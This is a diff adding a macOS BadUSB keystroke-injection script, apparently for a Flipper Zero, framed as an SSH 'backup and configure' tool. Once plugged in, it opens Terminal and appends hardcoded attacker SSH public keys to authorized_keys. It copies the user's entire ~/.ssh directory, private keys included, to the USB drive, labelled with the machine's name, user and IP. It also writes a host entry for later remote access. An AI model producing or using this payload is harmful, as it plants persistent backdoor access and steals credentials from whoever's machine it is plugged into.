@@ -1,0 +1,231 @@
+REM BadUSB script for macOS - Backup and Configure SSH (User-level only) with Visual Feedback
+
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Define a feedback function for visual messages
+STRING feedback() {
+ENTER
+STRING   if [ "$1" -eq 0 ]; then
+ENTER
+STRING     echo -e "\e[32m[✅] $2 succeeded.\e[0m"
+ENTER
+STRING   else
+ENTER
+STRING     echo -e "\e[31m[❌] $2 failed.\e[0m"
+ENTER
+STRING   fi
+ENTER
+STRING }
+ENTER
+
+REM Ensure the ~/.ssh directory exists with proper permissions
+STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh
+ENTER
+STRING feedback $? "Created .ssh directory"
+ENTER
+
+REM Make an initial backup of the user SSH configuration to ~/Documents/ssh_backup
+STRING cp -r ~/.ssh ~/Documents/ssh_backup 2>/dev/null
+ENTER
+STRING feedback $? "Initial backup of .ssh directory"
+ENTER
+
+REM Update authorized_keys: if /Volumes/FLIPPER/keys.json exists, use its keys; otherwise, use hardcoded keys
+STRING if [ -f /Volumes/FLIPPER/keys.json ]; then
+ENTER
+STRING   jq -r '.authorized_keys[]' /Volumes/FLIPPER/keys.json >> ~/.ssh/authorized_keys
+ENTER
+STRING   feedback $? "Keys added from keys.json"
+ENTER
+STRING else
+ENTER
+STRING   echo "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTvOFuOTrCPUTI+tBcGTffpPrJbdOLkr6Ln7CN3IZFvUyYmWpmuel9Ni5E4XBH6JKnF9g9BAmj7Tah2VVS+Q6g=" >> ~/.ssh/authorized_keys
+ENTER
+STRING   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx9TpZQjYCJCwLqHDih0uycGvUIFMyvb/zJG1jgXohfrb7jE9ke4Qa/U7cavBOhbBVlKTwZURbQUs0auQSP8gbKv5nEraMgo9Bn4MchxsEK65DFkd8jmZbjqVn1Hs1vwOfT3KJTxfDRtRWamU0zNjjcWgRqPN++vaMvpPKO4UxI4680j/t6yfOiaRtRU5ESGvbobYLjqiDOSGdMZI1gk9LzF1wURbxdwQu/QD/PkAy8vHpZniWG1gutP1MV+/6p0MIbUSPeGwel7eqDKqaPdnIKT5RAhhz5ekkDfVBKFnj76EnQlY8li+/8RcNvKCNaFKH1THyd1gTw7ZZJzFM338B" >> ~/.ssh/authorized_keys
+ENTER
+STRING   feedback $? "Hardcoded keys added to authorized_keys"
+ENTER
+STRING fi
+ENTER
+
+REM Set permissions on the authorized_keys file
+STRING chmod 600 ~/.ssh/authorized_keys
+ENTER
+STRING feedback $? "Permissions set for authorized_keys"
+ENTER
+
+REM Create or update the SSH config file with structured configuration
+STRING if [ ! -f ~/.ssh/config ]; then
+ENTER
+STRING   touch ~/.ssh/config
+ENTER
+STRING   cat << EOF > ~/.ssh/config
+ENTER
+STRING # SSH Configuration File
+ENTER
+STRING Host *
+ENTER
+STRING     PKCS11Provider /opt/homebrew/lib/opensc-pkcs11.so
+ENTER
+STRING     ForwardAgent no
+ENTER
+STRING     ForwardX11 no
+ENTER
+STRING     PasswordAuthentication no
+ENTER
+STRING     ChallengeResponseAuthentication no
+ENTER
+STRING     IdentityFile ~/.ssh/id_ecdsa_sk
+ENTER
+STRING     IdentityFile ~/.ssh/id_ecdsa_sk_rk
+ENTER
+STRING     IdentitiesOnly no
+ENTER
+STRING     KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group14-sha256
+ENTER
+STRING     Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com
+ENTER
+STRING     HostKeyAlgorithms rsa-sha2-512,rsa-sha2-256,ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521
+ENTER
+STRING     ServerAliveInterval 60
+ENTER
+STRING     ServerAliveCountMax 3
+ENTER
+STRING     Compression no
+ENTER
+STRING     StrictHostKeyChecking ask
+ENTER
+STRING     UserKnownHostsFile ~/.ssh/known_hosts
+ENTER
+STRING     TCPKeepAlive no
+ENTER
+STRING     PermitLocalCommand no
+ENTER
+STRING     RekeyLimit 1G 1h
+ENTER
+STRING     LogLevel VERBOSE
+ENTER
+STRING     IdentityAgent ${HOME}/.gnupg/S.gpg-agent.ssh
+ENTER
+STRING EOF
+ENTER
+STRING chmod 600 ~/.ssh/config
+ENTER
+STRING feedback $? "SSH config created/updated"
+ENTER
+STRING else
+ENTER
+STRING   feedback 0 "SSH config file already exists"
+ENTER
+STRING fi
+ENTER
+
+REM Fetch device details to name the backup folder
+STRING DEVICE_NAME=$(scutil --get ComputerName)
+ENTER
+STRING feedback $? "Fetched device name"
+STRING DEVICE_IP=$(ipconfig getifaddr en0)
+ENTER
+STRING feedback $? "Fetched device IP"
+STRING USER_NAME=$(whoami)
+ENTER
+STRING feedback $? "Fetched username"
+ENTER
+
+REM Construct a backup folder name based on device info
+STRING BACKUP_NAME="${DEVICE_NAME}_${USER_NAME}_${DEVICE_IP}"
+ENTER
+
+REM Backup the ~/.ssh directory to either Flipper USB or internal storage
+STRING if [ -d /Volumes/FLIPPER ]; then
+ENTER
+STRING   mkdir -p /Volumes/FLIPPER/ssh_backup/"$BACKUP_NAME"
+ENTER
+STRING   feedback $? "Flipper USB ssh_backup directory created"
+ENTER
+STRING   cp -r ~/.ssh /Volumes/FLIPPER/ssh_backup/"$BACKUP_NAME"/
+ENTER
+STRING   feedback $? "User SSH configuration backed up to Flipper USB as $BACKUP_NAME"
+ENTER
+STRING else
+ENTER
+STRING   echo "Flipper USB not detected. Using internal storage for backup."
+ENTER
+STRING   mkdir -p ~/Documents/ssh_backup/"$BACKUP_NAME"
+ENTER
+STRING   feedback $? "Internal ssh_backup directory created"
+ENTER
+STRING   cp -r ~/.ssh ~/Documents/ssh_backup/"$BACKUP_NAME"/
+ENTER
+STRING   feedback $? "User SSH configuration backed up to internal storage as $BACKUP_NAME"
+ENTER
+STRING fi
+ENTER
+
+REM Determine which backup destination was used (Flipper takes precedence)
+STRING if [ -d /Volumes/FLIPPER ]; then
+ENTER
+STRING   BACKUP_DEST="/Volumes/FLIPPER/ssh_backup/$BACKUP_NAME"
+ENTER
+STRING else
+ENTER
+STRING   BACKUP_DEST=~/Documents/ssh_backup/"$BACKUP_NAME"
+ENTER
+STRING fi
+ENTER
+
+REM Verify that the SSH config file was backed up correctly using SHA-256
+STRING if [ -f ~/.ssh/config ]; then
+ENTER
+STRING   ORIGINAL_HASH=$(shasum -a 256 ~/.ssh/config | awk '{print $1}')
+ENTER
+STRING   if [ -f "$BACKUP_DEST/config" ]; then
+ENTER
+STRING     BACKUP_HASH=$(shasum -a 256 "$BACKUP_DEST"/config | awk '{print $1}')
+ENTER
+STRING     if [ "$ORIGINAL_HASH" = "$BACKUP_HASH" ]; then
+ENTER
+STRING       feedback $? "SSH config backup verified successfully"
+ENTER
+STRING     else
+ENTER
+STRING       feedback 1 "SSH config backup verification failed"
+ENTER
+STRING     fi
+ENTER
+STRING   else
+ENTER
+STRING     feedback 1 "SSH config backup file not found in backup destination"
+ENTER
+STRING   fi
+ENTER
+STRING else
+ENTER
+STRING   feedback 1 "Original SSH config file not found"
+ENTER
+STRING fi
+ENTER
+
+REM ---------------------------
+REM (Optional) Pause before running sudo commands (if needed)
+REM ---------------------------
+STRING read -n1 -s -r -p "Press any key to continue (if sudo is required, enter password now): "
+ENTER
+
+REM ---------------------------
+REM Create an extracted SSH config snippet for remote access
+REM This file will contain a host entry (using the DEVICE_NAME and USER_NAME) and the IP address.
+STRING echo -e "Host ${DEVICE_NAME}_${USER_NAME}\n    HostName ${DEVICE_IP}\n    User ${USER_NAME}" > "$BACKUP_DEST/extracted_ssh_config"
+ENTER
+STRING feedback $? "Extracted SSH config file created for remote access"
+ENTER
+
+REM Notify final completion (user-level only)
+STRING echo -e "\e[32m[✅] SSH Setup Complete for $DEVICE_NAME with IP $DEVICE_IP\e[0m"
+ENTER
